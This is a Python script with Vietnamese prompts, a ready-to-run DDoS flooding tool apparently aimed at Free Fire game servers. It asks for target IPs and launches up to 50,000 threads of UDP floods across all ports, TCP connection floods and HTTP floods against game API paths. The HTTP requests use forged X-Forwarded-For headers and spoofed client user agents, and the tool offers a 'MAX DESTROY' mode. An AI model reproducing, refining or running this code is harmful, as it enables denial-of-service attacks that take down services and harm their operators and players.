# ============================================
# FF BYPASS DDoS - ALL PORTS 1-65535
# QUÉT TOÀN BỘ CỔNG - KHÔNG SÓT CỔNG NÀO
# 50000 THREADS - 500 SOCKET POOL - 4KB PAYLOAD
# ============================================

import socket
import time
import threading
import os
import random
from datetime import datetime

# ============================================
# TẤT CẢ CỔNG TỪ 1 ĐẾN 65535
# ============================================
ALL_PORTS = list(range(1, 65536))  # 65535 cổng

# ============================================
# CẤU HÌNH TỐI ĐA
# ============================================
MAX_THREADS = 50000
SOCKET_POOL_SIZE = 500
BATCH_SIZE = 1000
BURST_MULTIPLIER = 50
PAYLOAD_SIZE = 4096

USER_AGENTS = [
    "FreeFire/1.107.1 (Android 14; SDK 34; SM-S24 Ultra)",
    "FreeFire/1.107.0 (Android 13; SDK 33; Xiaomi 13 Pro)",
    "FreeFire/1.106.2 (Android 12; Realme GT 5)",
    "FreeFire/1.105.3 (Android 11; Redmi Note 12)",
    "Dalvik/2.1.0 (Linux; U; Android 14)",
    "okhttp/4.12.0 FreeFire-Client",
    "UnityPlayer/2021.3.29f1",
    "Mozilla/5.0 (Linux; Android 14) FreeFire-Game",
    "FreeFire/1.108.0 (iOS 17; iPhone 15 Pro Max)",
    "FreeFire/1.107.2 (HarmonyOS 4; Huawei Mate 60)",
]

API_PATHS = [
    "/api/v1/match/join", "/api/v1/match/status",
    "/api/v1/match/leave", "/api/v1/player/sync",
    "/api/v1/battle/update", "/api/v1/battle/start",
    "/api/v1/lobby/heartbeat", "/api/v1/lobby/chat",
    "/api/v2/game/sync", "/api/v2/match/report",
    "/api/v1/reward/claim", "/api/v1/reward/daily",
    "/api/v1/inventory/sync", "/api/v1/inventory/equip",
    "/api/v1/friend/status", "/api/v1/guild/sync",
    "/api/v1/event/check", "/api/v1/rank/update",
    "/api/v1/weapon/sync", "/api/v1/character/sync",
    "/api/v1/pet/sync", "/api/v1/skill/use",
    "/auth/login", "/auth/verify", "/auth/refresh",
    "/session/keepalive", "/session/extend",
    "/match/ready", "/match/start", "/match/end",
]

class AllPortsEngine:
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.connections = 0
        self.lock = threading.Lock()
        self.udp_pool = []
        self.pool_lock = threading.Lock()
        self.port_mode = "all"  # all / game / custom
        
    def inc(self, n=1):
        with self.lock: self.packets += n
    def inc_conn(self):
        with self.lock: self.connections += 1
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors, self.connections

    def _random_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _random_session(self):
        return os.urandom(16).hex()

    def _random_player_id(self):
        return str(random.randint(10000000, 99999999))

    def _random_port(self):
        """Lấy port ngẫu nhiên từ 1-65535"""
        return random.randint(1, 65535)

    def _init_pool(self):
        """Tạo pool socket"""
        print(f"  [🔧] Đang tạo {SOCKET_POOL_SIZE} socket...")
        for _ in range(SOCKET_POOL_SIZE):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65535)
                s.settimeout(0.05)
                self.udp_pool.append(s)
            except:
                pass
        print(f"  [✅] Đã tạo {len(self.udp_pool)} socket")

    def _get_socket(self):
        with self.pool_lock:
            if self.udp_pool:
                s = self.udp_pool.pop(0)
                self.udp_pool.append(s)
                return s
        return None

    def _udp_all_ports_worker(self, worker_id):
        """UDP Flood - QUÉT TOÀN BỘ 1-65535"""
        payload = os.urandom(PAYLOAD_SIZE)
        count = 0
        max_packets = 50000
        
        while self.running and count < max_packets:
            s = self._get_socket()
            if s is None:
                time.sleep(0.00001)
                continue
            
            try:
                ip = random.choice(self.targets)
                port = self._random_port()  # PORT NGẪU NHIÊN 1-65535
                
                # Burst 50 gói
                for _ in range(BURST_MULTIPLIER):
                    s.sendto(payload, (ip, port))
                    self.inc()
                    count += 1
                
                if count % 5000 == 0:
                    payload = os.urandom(random.randint(2048, 8192))
                    
            except:
                self.err()

    def _tcp_all_ports_worker(self, worker_id):
        """TCP SYN - QUÉT TOÀN BỘ 1-65535"""
        count = 0
        max_conn = 30000
        
        while self.running and count < max_conn:
            s = None
            try:
                ip = random.choice(self.targets)
                port = self._random_port()  # PORT NGẪU NHIÊN 1-65535
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
                s.settimeout(0.05)
                s.connect_ex((ip, port))
                
                fake_data = os.urandom(random.randint(256, 2048))
                s.send(fake_data)
                self.inc()
                self.inc_conn()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _http_all_ports_worker(self, worker_id):
        """HTTP Flood - QUÉT CỔNG WEB 1-65535"""
        count = 0
        max_req = 30000
        
        while self.running and count < max_req:
            s = None
            try:
                ip = random.choice(self.targets)
                port = self._random_port()  # PORT NGẪU NHIÊN 1-65535
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
                s.settimeout(0.1)
                s.connect_ex((ip, port))
                
                fake_ip = self._random_ip()
                ua = random.choice(USER_AGENTS)
                session = self._random_session()
                player_id = self._random_player_id()
                path = random.choice(API_PATHS)
                method = random.choice(["GET", "POST", "PUT"])
                
                if method == "POST":
                    body = os.urandom(random.randint(100, 1000)).hex()
                    req = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {ip}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"X-Forwarded-For: {fake_ip}\r\n"
                        f"X-Real-IP: {fake_ip}\r\n"
                        f"X-Player-Id: {player_id}\r\n"
                        f"X-Session-Token: {session}\r\n"
                        f"X-Device-Id: {os.urandom(8).hex()}\r\n"
                        f"Content-Type: application/octet-stream\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n{body}"
                    )
                else:
                    req = (
                        f"{method} {path} HTTP/1.1\r\n"
                        f"Host: {ip}\r\n"
                        f"User-Agent: {ua}\r\n"
                        f"X-Forwarded-For: {fake_ip}\r\n"
                        f"X-Real-IP: {fake_ip}\r\n"
                        f"X-Player-Id: {player_id}\r\n"
                        f"X-Session-Token: {session}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                
                s.send(req.encode())
                self.inc()
                self.inc_conn()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _batch_launcher(self, total_threads, worker_func):
        """Phóng batch thread"""
        created = 0
        
        while self.running and created < total_threads:
            batch = min(BATCH_SIZE, total_threads - created)
            
            for i in range(batch):
                t = threading.Thread(
                    target=worker_func,
                    args=(created + i,),
                    daemon=True
                )
                t.start()
                created += 1
            
            if created < total_threads:
                time.sleep(0.1)
                print(f"\r  [⏳] {created}/{total_threads} threads...", end='')

    def start(self, targets, threads, udp_pct, tcp_pct, http_pct):
        if self.running:
            self.stop()
            time.sleep(0.3)
        
        if not targets:
            return 0, 0, 0, 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        self.connections = 0
        
        self._init_pool()
        
        threads = min(threads, MAX_THREADS)
        
        udp_n = int(threads * udp_pct / 100)
        tcp_n = int(threads * tcp_pct / 100)
        http_n = int(threads * http_pct / 100)
        
        if udp_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(udp_n, self._udp_all_ports_worker),
                daemon=True
            ).start()
        
        if tcp_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(tcp_n, self._tcp_all_ports_worker),
                daemon=True
            ).start()
        
        if http_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(http_n, self._http_all_ports_worker),
                daemon=True
            ).start()
        
        return udp_n + tcp_n + http_n, udp_n, tcp_n, http_n

    def stop(self):
        self.running = False
        for s in self.udp_pool:
            try: s.close()
            except: pass
        self.udp_pool.clear()


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════════╗
    ║  ☠ FF DDoS - ALL PORTS 1-65535 ☠         ║
    ║  QUÉT TOÀN BỘ CỔNG - KHÔNG GIỚI HẠN      ║
    ║  {MAX_THREADS} THREADS | {SOCKET_POOL_SIZE} SOCKETS | 4KB       ║
    ╚══════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    print("  [+] NHẬP IP MỤC TIÊU:")
    ip_input = input("\n  >> ").strip()
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!"); input(); return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ IP!"); input(); return
    
    print(f"\n  [+] SỐ THREADS (tối đa {MAX_THREADS}):")
    try:
        threads = int(input("  >> ").strip() or "10000")
        threads = max(100, min(threads, MAX_THREADS))
    except:
        threads = 10000
    
    print(f"\n  [+] CHẾ ĐỘ:")
    print(f"      1. MAX DESTROY (UDP 70% + TCP 20% + HTTP 10%)")
    print(f"      2. UDP FOCUS (UDP 90% + TCP 5% + HTTP 5%)")
    print(f"      3. BALANCED (UDP 50% + TCP 25% + HTTP 25%)")
    print(f"      4. TỰ CHỈNH")
    mode = input("  >> ").strip() or "1"
    
    if mode == "1": udp_pct, tcp_pct, http_pct = 70, 20, 10
    elif mode == "2": udp_pct, tcp_pct, http_pct = 90, 5, 5
    elif mode == "3": udp_pct, tcp_pct, http_pct = 50, 25, 25
    elif mode == "4":
        try:
            udp_pct = int(input("  UDP %: ").strip() or "60")
            tcp_pct = int(input("  TCP %: ").strip() or "25")
            http_pct = int(input("  HTTP %: ").strip() or "15")
            if udp_pct + tcp_pct + http_pct != 100:
                udp_pct, tcp_pct, http_pct = 70, 20, 10
        except:
            udp_pct, tcp_pct, http_pct = 70, 20, 10
    else:
        udp_pct, tcp_pct, http_pct = 70, 20, 10
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads} THREADS...")
    print(f"  [📊] UDP: {udp_pct}% | TCP: {tcp_pct}% | HTTP: {http_pct}%")
    print(f"  [🔌] PORT: 1-65535 (TOÀN BỘ)")
    
    engine = AllPortsEngine()
    total, udp_n, tcp_n, http_n = engine.start(targets, threads, udp_pct, tcp_pct, http_pct)
    
    if not total:
        print("  [-] LỖI!"); input(); return
    
    start_time = time.time()
    print(f"\n  [✅] {total} THREADS!")
    print(f"  [UDP] {udp_n} | [TCP] {tcp_n} | [HTTP] {http_n}")
    print(f"  [🎯] {len(targets)} IP | [🔌] 1-65535")
    print(f"\n  ╔══════════════════════════════════╗")
    print(f"  ║  ENTER = DỪNG                  ║")
    print(f"  ╚══════════════════════════════════╝")
    
    monitor_run = True
    def monitor():
        while monitor_run and engine.running:
            p, e, c = engine.get()
            el = time.time() - start_time
            pps = p / el if el > 0 else 0
            m, s = divmod(int(el), 60)
            print(f"\r  [📊] GÓI: {p:,} | {pps:,.0f}/s | CONN: {c:,} | LỖI: {e} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.2)
    
    threading.Thread(target=monitor, daemon=True).start()
    input()
    
    engine.stop()
    monitor_run = False
    time.sleep(0.5)
    
    p, e, c = engine.get()
    el = time.time() - start_time
    pps = p / el if el > 0 else 0
    m, s = divmod(int(el), 60)
    
    print(f"""\n
    ╔══════════════════════════════════════════════╗
    ║           KẾT THÚC                           ║
    ╠══════════════════════════════════════════════╣
    ║  TIME:     {m:>2}p {s:>2}s                          ║
    ║  GÓI:      {p:>12,}                        ║
    ║  TỐC ĐỘ:   {pps:>12,.0f}/s                    ║
    ║  KẾT NỐI:  {c:>12,}                        ║
    ║  LỖI:      {e:>12,}                        ║
    ║  THREADS:  {total:>12,}                        ║
    ║  PORTS:    1-65535 (ALL)                    ║
    ╚══════════════════════════════════════════════╝
    """)
    input()

if __name__ == '__main__':
    main()
